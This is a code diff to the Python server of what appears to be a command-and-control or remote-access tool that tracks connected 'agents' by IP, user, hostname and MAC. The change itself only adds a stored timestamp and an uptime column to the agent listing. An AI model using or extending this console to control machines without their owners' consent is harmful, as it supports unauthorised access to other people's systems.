@@ -2,7 +2,7 @@ import socket, threading, ssl
 import secrets, os, platform, json
 from agent import Agent
 from symbols import *
-import select
+import select, datetime
 from prompt_toolkit import PromptSession
 
 class Server:
@@ -126,6 +126,7 @@ class Server:
         agent.user = json_object['user']
         agent.mac = json_object['mac']
         agent.uid = json_object['uid']
+        agent.timestamp = json_object['timestamp']
 
 
     def acceptConnections(self):
@@ -185,10 +186,10 @@ class Server:
         if self.agents:
             print("")
             print("=" * 90)
-            print(f"{'ID':<5}{'IP Address':<20}{'Port':<10}{'User':<15}{'Hostname':<30}")
+            print(f"{'ID':<5}{'IP Address':<20}{'Port':<10}{'User':<15}{'Hostname':<20}{'Uptime':<15}")
             print("-" * 90)
             for agent in self.agents:
-                print(f"{agent.id:<5}{agent.ip:<20}{agent.port:<10}{agent.user:<15}{agent.hostname:<30}")
+                print(f"{agent.id:<5}{agent.ip:<20}{agent.port:<10}{agent.user:<15}{agent.hostname:<20}{self.getAgentUptime(agent)}")
             print("=" * 90)
             print("")
         else:
@@ -381,3 +382,20 @@ class Server:
                     print(f"\nAgent {agent.id} died ({agent.ip})")
                     self.killAgent(agent.id)
             self.stop_event.wait(2)
+
+    
+    def getAgentUptime(self, agent):
+        timestamp = datetime.datetime.now()
+
+        difference = timestamp - datetime.datetime.fromisoformat(agent.timestamp)
+        days = difference.days
+
+        # Retrieving days, hours, minutes and seconds from the difference
+        hours, remainder = divmod(difference.seconds, 3600)
+        minutes, seconds = divmod(remainder, 60)
+        
+        # Add days hours minute to the list only if they are greater than zero to skip useless data
+        result = [f"{value}{name}" for value, name in [(days, "d"), (hours, "h"), (minutes, "m"), (seconds, "s")] if value > 0]
+
+        # join the list to a string
+        return ' '.join(result)
